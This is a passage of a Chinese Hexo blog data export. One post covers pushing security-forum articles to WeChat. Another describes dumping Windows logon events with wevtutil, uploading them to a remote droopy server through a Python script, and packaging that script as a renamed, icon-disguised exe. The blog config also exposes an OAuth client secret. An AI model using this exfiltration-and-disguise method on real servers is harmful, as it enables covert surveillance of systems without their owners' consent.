4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":"<p>以先知社区推送为例，时时推送最新文章</p>\n<p><a href=\"https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login\" target=\"_blank\" rel=\"noopener\">接口url</a></p>\n<p><a href=\"https://xz.aliyun.com/\" target=\"_blank\" rel=\"noopener\">社区url</a></p>\n<h3 id=\"微信登录获取appID与appsecret\"><a href=\"#微信登录获取appID与appsecret\" class=\"headerlink\" title=\"微信登录获取appID与appsecret\"></a>微信登录获取<code>appID</code>与<code>appsecret</code></h3><p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/image-20200716111925314.png\" alt=\"image-20200716111925314\"></p>\n<h3 id=\"获取OpenID\"><a href=\"#获取OpenID\" class=\"headerlink\" title=\"获取OpenID\"></a>获取<code>OpenID</code></h3><p>接收推送的微信扫描关注测试公众号，获取关注者的微信的<code>OpenID</code></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/image-20200716112417023.png\" alt=\"image-20200716112417023\"></p>\n<h3 id=\"获取模板template-id\"><a href=\"#获取模板template-id\" class=\"headerlink\" title=\"获取模板template_id\"></a>获取模板<code>template_id</code></h3><p>新增测试模板，模板内容格式参数需以.DATA结尾；</p>\n<p>想要推送的格式为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">社区推送</span><br><span class=\"line\">2020-06-12 11:44:01</span><br><span class=\"line\">author/tags</span><br><span class=\"line\"></span><br><span class=\"line\">某CMS代码审计</span><br><span class=\"line\"></span><br><span class=\"line\">https://xz.aliyun.com/t/xxxx</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594872349.jpg\" alt=\"1594872349\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594872255.jpg\" alt=\"1594872255\"></p>\n<h3 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h3><p>需要用到的<code>appID</code>、<code>appsecret</code>、<code>OpenID</code>和<code>template_id</code></p>\n<blockquote>\n<p>获取access_token-&gt;获取用户OpenID-&gt;获取推送文章-&gt;推送</p>\n</blockquote>\n<p>详细可参考开发文档</p>\n<p><a href=\"https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html\" target=\"_blank\" rel=\"noopener\">获取access_token</a></p>\n<p><a href=\"https://developers.weixin.qq.com/doc/offiaccount/User_Management/Getting_a_User_List.html\" target=\"_blank\" rel=\"noopener\">获取OpenID</a></p>\n<p><a href=\"https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Template_Message_Interface.html\" target=\"_blank\" rel=\"noopener\">发送</a></p>\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><p>获取的access_token有效时间是2个小时，可以将获取的access_token保存到文本时，需要时提取，失效了再重新获取，不然获取太频繁会重置</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_access_token</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&#123;&#125;&amp;secret=&#123;&#125;'</span>.format(self.appid,self.appsecret)</span><br><span class=\"line\">    r = request(<span class=\"string\">'get'</span>,url,headers=self.headers,proxies=self.proxies,verify=<span class=\"literal\">False</span>,allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    f = open(<span class=\"string\">'access_token'</span>,<span class=\"string\">'w+'</span>)</span><br><span class=\"line\">    f.write(loads(r.text)[<span class=\"string\">'access_token'</span>])</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure>\n\n<p>获取<code>OpenID</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_user_list</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">    f = open(<span class=\"string\">'access_token'</span>,<span class=\"string\">'r+'</span>)</span><br><span class=\"line\">    self.access_token = f.readline()</span><br><span class=\"line\">    url = <span class=\"string\">'https://api.weixin.qq.com/cgi-bin/user/get?access_token=&#123;&#125;&amp;next_openid='</span>.format(self.access_token)</span><br><span class=\"line\">    r = request(<span class=\"string\">'get'</span>, url,headers=self.headers,proxies=self.proxies,verify=<span class=\"literal\">False</span>,allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> loads(text)[<span class=\"string\">'data'</span>][<span class=\"string\">'openid'</span>]</span><br></pre></td></tr></table></figure>\n\n<p>获取推送文章，爬虫抓取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">'title'</span>: <span class=\"string\">'内网Mysql代理浅析\\n'</span>, <span class=\"string\">'author/tag'</span>: <span class=\"string\">'kuron3k0/渗透测试\\n'</span>, <span class=\"string\">'url'</span>: <span class=\"string\">'https://xz.aliyun.com//t/7993'</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发送的数据为json格式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_msg</span><span class=\"params\">(self,openid,info,template)</span>:</span></span><br><span class=\"line\">    msg = &#123;</span><br><span class=\"line\">        <span class=\"string\">\"touser\"</span>: openid,</span><br><span class=\"line\">        <span class=\"string\">\"template_id\"</span>: template,</span><br><span class=\"line\">        <span class=\"string\">\"url\"</span>: info[<span class=\"string\">'url'</span>],</span><br><span class=\"line\">        <span class=\"string\">\"data\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'time'</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">'value'</span>: strftime(<span class=\"string\">\"%Y-%m-%d %H:%M:%S\"</span>, localtime())</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"string\">\"author/tag\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"value\"</span>: info[<span class=\"string\">'author/tag'</span>],</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"string\">\"title\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"value\"</span>: info[<span class=\"string\">'title'</span>],</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"string\">\"url\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"value\"</span>: info[<span class=\"string\">'url'</span>],</span><br><span class=\"line\">                <span class=\"string\">\"color\"</span>: <span class=\"string\">\"#173177\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    new_msg = dumps(msg, ensure_ascii=<span class=\"literal\">False</span>).encode(<span class=\"string\">'utf-8'</span>, <span class=\"string\">\"ignore\"</span>)</span><br><span class=\"line\">    url = <span class=\"string\">'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token='</span> + self.access_token</span><br><span class=\"line\">    r = request(<span class=\"string\">'post'</span>, url=url, data=new_msg, headers=self.headers, proxies=self.proxies, verify=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                allow_redirects=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h3><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594884408.jpg\" alt=\"1594884408\" style=\"zoom:50%;\">\n\n<img src=\"https://yui77111.github.io/assets/images/article/wechatpush/118b9d1c372e5711071e68711da5f3b.jpg\" alt=\"118b9d1c372e5711071e68711da5f3b\" style=\"zoom:19%;\">\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>推送只是微信接口的其中一个功能，想要了解其他功能可以参考开发文档。</p>\n<p>脚本循环提取有些网站可能会因访问太频繁而ban了，可以自加代理，这里提供几个代理网址，可以自己提取使用。(<a href=\"http://www.66ip.cn/，http://www.89ip.cn/，https://ip.jiangxianli.com/api/proxy_ip，http://www.data5u.com/，http://www.goubanjia.com/，http://www.xdaili.cn/，https://www.kuaidaili.com/，http://www.ip3366.net/，https://list.proxylistplus.com/\" target=\"_blank\" rel=\"noopener\">http://www.66ip.cn/，http://www.89ip.cn/，https://ip.jiangxianli.com/api/proxy_ip，http://www.data5u.com/，http://www.goubanjia.com/，http://www.xdaili.cn/，https://www.kuaidaili.com/，http://www.ip3366.net/，https://list.proxylistplus.com/</a>)</p>\n"},{"title":"droopy","description":"droopy","_content":"\npython写的一个文件上传功能的Web服务器\n\n[源码](http://stackp.online.fr/wp-content/uploads/droopy)\n\n![1594886013](https://yui77111.github.io/assets/images/article/droopy/1594886013.jpg)\n\n我们用到的参数有-d指定上传路径、-a指定访问401验证账号密码\n\n![1594888077](https://yui77111.github.io/assets/images/article/droopy/1594888077.jpg)\n\n![1594888031](https://yui77111.github.io/assets/images/article/droopy/1594888031.jpg)\n\n### 思路\n\n遇到什么大project的时候，经常被要求要获取服务器的3389登录ip，但有时需要的是长时间监控服务器才能获取最新的登录ip，所以这时候就靠自动化\n\n> 获取本地登录事件并保存到文本->通过droopy上传到服务器->后续可以加短信、邮件或wechat推送通知\n\n和ftp的区别在于，ftp的账号密码是写在文件里的，对面拿到exe可以逆向拿到你ftp的账号密码，登录上去看到你服务器上的文件，而droopy即使拿到了401账号密码进去后也只有一个上传功能，虽説不能保证后面会不会爆什么安全漏洞但目前来説还没有问题。\n\n### wevtutil获取登录事件\n\n获取事件ID4624并保存到logins.txt里，4624为登录成功日志，多事件ID可用or分隔\n\n```\nwevtutil qe Security \"/q:*[System [(EventID=4624)]]\" /rd:true /f:text > \"logins.txt\"\n```\n\n### python\n\n```python\nclass myupload():\n    def __init__(self,url):\n        self.url = url\n\n    def upload(self,upload_file):\n        files = {'upfile':(upload_file.split(sep)[-1],open(upload_file,'rb'),'text/plain',{})}\n        request('POST',self.url,data=None,files=files,auth=('thomas','thomastom'))\n```\n\n### 效果\n\n![1594889003](https://yui77111.github.io/assets/images/article/droopy/1594889003.jpg)\n\n![1594889124](https://yui77111.github.io/assets/images/article/droopy/1594889124.jpg)\n\n### 其他\n\n将写好的.py用pyinstaller打包，打包的时候可以-i加个icon图标，再把名改改伪造伪造。\n\npy打包exe体积太大可以通过虚拟环境内打包解决\n\n```python\n#建立虚拟环境\npipenv install\n#进入虚拟环境\npipenv shell\n#安装模块\npip install 小工具.py里面用到的模块\n#打包的模块也要安装\npip install pyinstaller\n#开始打包\npyinstaller -Fw E:\\test\\url_crawler.py\n```\n\n","source":"_posts/2020-06-18-droopy.md","raw":"---\ntitle: droopy\ndescription: droopy\ncategories:\n - tools\n - python\ntags: \n - python\n---\n\npython写的一个文件上传功能的Web服务器\n\n[源码](http://stackp.online.fr/wp-content/uploads/droopy)\n\n![1594886013](https://yui77111.github.io/assets/images/article/droopy/1594886013.jpg)\n\n我们用到的参数有-d指定上传路径、-a指定访问401验证账号密码\n\n![1594888077](https://yui77111.github.io/assets/images/article/droopy/1594888077.jpg)\n\n![1594888031](https://yui77111.github.io/assets/images/article/droopy/1594888031.jpg)\n\n### 思路\n\n遇到什么大project的时候，经常被要求要获取服务器的3389登录ip，但有时需要的是长时间监控服务器才能获取最新的登录ip，所以这时候就靠自动化\n\n> 获取本地登录事件并保存到文本->通过droopy上传到服务器->后续可以加短信、邮件或wechat推送通知\n\n和ftp的区别在于，ftp的账号密码是写在文件里的，对面拿到exe可以逆向拿到你ftp的账号密码，登录上去看到你服务器上的文件，而droopy即使拿到了401账号密码进去后也只有一个上传功能，虽説不能保证后面会不会爆什么安全漏洞但目前来説还没有问题。\n\n### wevtutil获取登录事件\n\n获取事件ID4624并保存到logins.txt里，4624为登录成功日志，多事件ID可用or分隔\n\n```\nwevtutil qe Security \"/q:*[System [(EventID=4624)]]\" /rd:true /f:text > \"logins.txt\"\n```\n\n### python\n\n```python\nclass myupload():\n    def __init__(self,url):\n        self.url = url\n\n    def upload(self,upload_file):\n        files = {'upfile':(upload_file.split(sep)[-1],open(upload_file,'rb'),'text/plain',{})}\n        request('POST',self.url,data=None,files=files,auth=('thomas','thomastom'))\n```\n\n### 效果\n\n![1594889003](https://yui77111.github.io/assets/images/article/droopy/1594889003.jpg)\n\n![1594889124](https://yui77111.github.io/assets/images/article/droopy/1594889124.jpg)\n\n### 其他\n\n将写好的.py用pyinstaller打包，打包的时候可以-i加个icon图标，再把名改改伪造伪造。\n\npy打包exe体积太大可以通过虚拟环境内打包解决\n\n```python\n#建立虚拟环境\npipenv install\n#进入虚拟环境\npipenv shell\n#安装模块\npip install 小工具.py里面用到的模块\n#打包的模块也要安装\npip install pyinstaller\n#开始打包\npyinstaller -Fw E:\\test\\url_crawler.py\n```\n\n","slug":"2020-06-18-droopy","published":1,"date":"2021-04-21T07:29:10.990Z","updated":"2020-07-24T06:14:38.895Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknr54xhj000j8ot9g3rcsk99","content":"<p>python写的一个文件上传功能的Web服务器</p>\n<p><a href=\"http://stackp.online.fr/wp-content/uploads/droopy\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594886013.jpg\" alt=\"1594886013\"></p>\n<p>我们用到的参数有-d指定上传路径、-a指定访问401验证账号密码</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594888077.jpg\" alt=\"1594888077\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594888031.jpg\" alt=\"1594888031\"></p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>遇到什么大project的时候，经常被要求要获取服务器的3389登录ip，但有时需要的是长时间监控服务器才能获取最新的登录ip，所以这时候就靠自动化</p>\n<blockquote>\n<p>获取本地登录事件并保存到文本-&gt;通过droopy上传到服务器-&gt;后续可以加短信、邮件或wechat推送通知</p>\n</blockquote>\n<p>和ftp的区别在于，ftp的账号密码是写在文件里的，对面拿到exe可以逆向拿到你ftp的账号密码，登录上去看到你服务器上的文件，而droopy即使拿到了401账号密码进去后也只有一个上传功能，虽説不能保证后面会不会爆什么安全漏洞但目前来説还没有问题。</p>\n<h3 id=\"wevtutil获取登录事件\"><a href=\"#wevtutil获取登录事件\" class=\"headerlink\" title=\"wevtutil获取登录事件\"></a>wevtutil获取登录事件</h3><p>获取事件ID4624并保存到logins.txt里，4624为登录成功日志，多事件ID可用or分隔</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wevtutil qe Security &quot;/q:*[System [(EventID=4624)]]&quot; /rd:true /f:text &gt; &quot;logins.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">myupload</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,url)</span>:</span></span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upload</span><span class=\"params\">(self,upload_file)</span>:</span></span><br><span class=\"line\">        files = &#123;<span class=\"string\">'upfile'</span>:(upload_file.split(sep)[<span class=\"number\">-1</span>],open(upload_file,<span class=\"string\">'rb'</span>),<span class=\"string\">'text/plain'</span>,&#123;&#125;)&#125;</span><br><span class=\"line\">        request(<span class=\"string\">'POST'</span>,self.url,data=<span class=\"literal\">None</span>,files=files,auth=(<span class=\"string\">'thomas'</span>,<span class=\"string\">'thomastom'</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h3><p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594889003.jpg\" alt=\"1594889003\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594889124.jpg\" alt=\"1594889124\"></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>将写好的.py用pyinstaller打包，打包的时候可以-i加个icon图标，再把名改改伪造伪造。</p>\n<p>py打包exe体积太大可以通过虚拟环境内打包解决</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#建立虚拟环境</span></span><br><span class=\"line\">pipenv install</span><br><span class=\"line\"><span class=\"comment\">#进入虚拟环境</span></span><br><span class=\"line\">pipenv shell</span><br><span class=\"line\"><span class=\"comment\">#安装模块</span></span><br><span class=\"line\">pip install 小工具.py里面用到的模块</span><br><span class=\"line\"><span class=\"comment\">#打包的模块也要安装</span></span><br><span class=\"line\">pip install pyinstaller</span><br><span class=\"line\"><span class=\"comment\">#开始打包</span></span><br><span class=\"line\">pyinstaller -Fw E:\\test\\url_crawler.py</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":"<p>python写的一个文件上传功能的Web服务器</p>\n<p><a href=\"http://stackp.online.fr/wp-content/uploads/droopy\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594886013.jpg\" alt=\"1594886013\"></p>\n<p>我们用到的参数有-d指定上传路径、-a指定访问401验证账号密码</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594888077.jpg\" alt=\"1594888077\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594888031.jpg\" alt=\"1594888031\"></p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>遇到什么大project的时候，经常被要求要获取服务器的3389登录ip，但有时需要的是长时间监控服务器才能获取最新的登录ip，所以这时候就靠自动化</p>\n<blockquote>\n<p>获取本地登录事件并保存到文本-&gt;通过droopy上传到服务器-&gt;后续可以加短信、邮件或wechat推送通知</p>\n</blockquote>\n<p>和ftp的区别在于，ftp的账号密码是写在文件里的，对面拿到exe可以逆向拿到你ftp的账号密码，登录上去看到你服务器上的文件，而droopy即使拿到了401账号密码进去后也只有一个上传功能，虽説不能保证后面会不会爆什么安全漏洞但目前来説还没有问题。</p>\n<h3 id=\"wevtutil获取登录事件\"><a href=\"#wevtutil获取登录事件\" class=\"headerlink\" title=\"wevtutil获取登录事件\"></a>wevtutil获取登录事件</h3><p>获取事件ID4624并保存到logins.txt里，4624为登录成功日志，多事件ID可用or分隔</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wevtutil qe Security &quot;/q:*[System [(EventID=4624)]]&quot; /rd:true /f:text &gt; &quot;logins.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">myupload</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,url)</span>:</span></span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upload</span><span class=\"params\">(self,upload_file)</span>:</span></span><br><span class=\"line\">        files = &#123;<span class=\"string\">'upfile'</span>:(upload_file.split(sep)[<span class=\"number\">-1</span>],open(upload_file,<span class=\"string\">'rb'</span>),<span class=\"string\">'text/plain'</span>,&#123;&#125;)&#125;</span><br><span class=\"line\">        request(<span class=\"string\">'POST'</span>,self.url,data=<span class=\"literal\">None</span>,files=files,auth=(<span class=\"string\">'thomas'</span>,<span class=\"string\">'thomastom'</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h3><p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594889003.jpg\" alt=\"1594889003\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/droopy/1594889124.jpg\" alt=\"1594889124\"></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>将写好的.py用pyinstaller打包，打包的时候可以-i加个icon图标，再把名改改伪造伪造。</p>\n<p>py打包exe体积太大可以通过虚拟环境内打包解决</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#建立虚拟环境</span></span><br><span class=\"line\">pipenv install</span><br><span class=\"line\"><span class=\"comment\">#进入虚拟环境</span></span><br><span class=\"line\">pipenv shell</span><br><span class=\"line\"><span class=\"comment\">#安装模块</span></span><br><span class=\"line\">pip install 小工具.py里面用到的模块</span><br><span class=\"line\"><span class=\"comment\">#打包的模块也要安装</span></span><br><span class=\"line\">pip install pyinstaller</span><br><span class=\"line\"><span class=\"comment\">#开始打包</span></span><br><span class=\"line\">pyinstaller -Fw 